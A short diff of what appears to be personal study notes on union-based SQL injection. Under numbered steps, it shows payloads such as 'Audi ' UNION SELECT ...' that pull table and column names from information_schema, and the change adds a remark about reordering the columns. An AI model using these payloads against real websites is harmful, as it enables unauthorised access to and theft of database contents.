@@ -43,7 +43,7 @@ ________________________________________________________________________________
     Audi ' UNION SELECT 1,2,3,4,5 #
     
 ### 3-Modify Goldent Statement to include all information.
-#### UNION SELECT table_schema,table_name,column_name FROM information_schema.columns
+#### UNION SELECT table_schema,table_name,column_name FROM information_schema.columns (below is altered to match out of order fields!!!!!!!!!!!!!!!!!!!!!!!!!!)
     Audi ' UNION SELECT table_schema,2,table_name,column_name,5 FROM information_schema.columns #
 
 ### 4-Craft the queries.
